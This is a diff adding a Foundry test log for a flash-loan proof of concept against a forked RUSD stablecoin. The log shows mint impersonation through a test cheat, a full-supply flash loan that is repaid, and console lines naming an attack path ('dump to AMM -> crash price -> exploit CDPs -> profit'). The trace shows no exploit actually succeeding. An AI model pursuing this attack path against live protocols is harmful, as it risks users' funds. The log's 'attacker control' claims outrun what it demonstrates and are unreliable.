@@ -1,0 +1,135 @@
+Compiling 1 files with Solc 0.8.33
+Solc 0.8.33 finished in 385.18ms
+Compiler run successful with warnings:
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> test/PoC_Resolv_FlashLoan.t.sol:95:9:
+   |
+95 |         address token,
+   |         ^^^^^^^^^^^^^
+
+
+Ran 2 tests for test/PoC_Resolv_FlashLoan.t.sol:PoC_Resolv_FlashLoan
+[PASS] test_flashLoan_fullExecute() (gas: 158988)
+Logs:
+  === FLASH LOAN FULL EXECUTION ===
+  Loan amount  : 12914 RUSD
+  Fee          : 11 RUSD
+  Fee funding via mint impersonation: true
+  Our balance before loan: 23 RUSD
+  --- INSIDE FLASH LOAN CALLBACK ---
+  Borrowed      : 12914 RUSD
+  Fee           : 11 RUSD
+  Our balance   : 12937 RUSD
+  Total supply  : 25852 RUSD (inflated)
+  ATTACK WINDOW : entire circulating supply under attacker control
+  ATTACK VECTOR : dump to AMM -> crash price -> exploit CDPs -> profit
+  Flash loan completed: true
+  Our balance after    : 11 RUSD
+  Total supply after   : 12937 RUSD
+
+Traces:
+  [178888] PoC_Resolv_FlashLoan::test_flashLoan_fullExecute()
+    ├─ [2405] RUSD::totalSupply() [staticcall]
+    │   └─ ← [Return] 12914534451302647155823 [1.291e22]
+    ├─ [712] RUSD::flashFee(RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], 12914534451302647155823 [1.291e22]) [staticcall]
+    │   └─ ← [Return] 11623081006172382440 [1.162e19]
+    ├─ [0] console::log("=== FLASH LOAN FULL EXECUTION ===") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Loan amount  :", 12914 [1.291e4], "RUSD") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Fee          :", 11, "RUSD") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(BorrowerOps: [0xeCabcF7d41Ca644f87B25704cF77E3011D9a70a1])
+    │   └─ ← [Return]
+    ├─ [27672] RUSD::mint(PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 23246162012344764880 [2.324e19])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 23246162012344764880 [2.324e19])
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Fee funding via mint impersonation:", true) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [620] RUSD::balanceOf(PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 23246162012344764880 [2.324e19]
+    ├─ [0] console::log("Our balance before loan:", 23, "RUSD") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [77626] RUSD::flashLoan(PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], 12914534451302647155823 [1.291e22], 0x)
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 12914534451302647155823 [1.291e22])
+    │   ├─ [38024] PoC_Resolv_FlashLoan::onFlashLoan(PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], 12914534451302647155823 [1.291e22], 11623081006172382440 [1.162e19], 0x)
+    │   │   ├─ [0] console::log("--- INSIDE FLASH LOAN CALLBACK ---") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Borrowed      :", 12914 [1.291e4], "RUSD") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Fee           :", 11, "RUSD") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [620] RUSD::balanceOf(PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 12937780613314991920703 [1.293e22]
+    │   │   ├─ [0] console::log("Our balance   :", 12937 [1.293e4], "RUSD") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [405] RUSD::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 25852315064617639076526 [2.585e22]
+    │   │   ├─ [0] console::log("Total supply  :", 25852 [2.585e4], "RUSD (inflated)") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("ATTACK WINDOW : entire circulating supply under attacker control") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("ATTACK VECTOR : dump to AMM -> crash price -> exploit CDPs -> profit") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [24653] RUSD::approve(RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], 12926157532308819538263 [1.292e22])
+    │   │   │   ├─ emit Approval(owner: PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], value: 12926157532308819538263 [1.292e22])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9
+    │   ├─ emit Approval(owner: PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], value: 0)
+    │   ├─ emit Transfer(from: PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 12914534451302647155823 [1.291e22])
+    │   ├─ [2359] PrismaCore::feeReceiver() [staticcall]
+    │   │   └─ ← [Return] 0xfdCE0267803C6a0D209D3721d2f01Fd618e9CBF8
+    │   ├─ emit Transfer(from: PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xfdCE0267803C6a0D209D3721d2f01Fd618e9CBF8, value: 11623081006172382440 [1.162e19])
+    │   └─ ← [Return] true
+    ├─ [0] console::log("Flash loan completed:", true) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [620] RUSD::balanceOf(PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 11623081006172382440 [1.162e19]
+    ├─ [0] console::log("Our balance after    :", 11, "RUSD") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [405] RUSD::totalSupply() [staticcall]
+    │   └─ ← [Return] 12937780613314991920703 [1.293e22]
+    ├─ [0] console::log("Total supply after   :", 12937 [1.293e4], "RUSD") [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+[FAIL: Contract 0xda3de145054ED30Ee937865D31B500505C4bDfe7 does not exist and is not marked as persistent, see `vm.makePersistent()`] test_recon() (gas: 11452)
+Traces:
+  [7022] PoC_Resolv_FlashLoan::setUp()
+    ├─ [0] VM::envString("ETH_RPC_URL") [staticcall]
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::createSelectFork("<rpc url>")
+    │   └─ ← [Return] 1
+    ├─ [0] VM::label(RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], "RUSD")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(BorrowerOps: [0xeCabcF7d41Ca644f87B25704cF77E3011D9a70a1], "BorrowerOps")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(StabilityPool: [0x6953504F2f4537D7a7B4024508f321f7816BB6ED], "StabilityPool")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [11452] PoC_Resolv_FlashLoan::test_recon()
+    ├─ [2405] RUSD::totalSupply() [staticcall]
+    │   └─ ← [Return] 12914534451302647155823 [1.291e22]
+    ├─ [721] RUSD::maxFlashLoan(RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564026543049556610482484112 [1.157e77]
+    ├─ [712] RUSD::flashFee(RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], 1000000000000000000000000 [1e24]) [staticcall]
+    │   └─ ← [Return] 900000000000000000000 [9e20]
+    ├─ [0] 0xda3de145054ED30Ee937865D31B500505C4bDfe7::feeReceiver() [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Revert] call to non-contract address 0xda3de145054ED30Ee937865D31B500505C4bDfe7
+
+Backtrace:
+  at PoC_Resolv_FlashLoan.test_recon
+
+Suite result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 5.53s (3.48s CPU time)
+
+Ran 1 test suite in 19.15s (5.53s CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/PoC_Resolv_FlashLoan.t.sol:PoC_Resolv_FlashLoan
+[FAIL: Contract 0xda3de145054ED30Ee937865D31B500505C4bDfe7 does not exist and is not marked as persistent, see `vm.makePersistent()`] test_recon() (gas: 11452)
+
+Encountered a total of 1 failing tests, 1 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
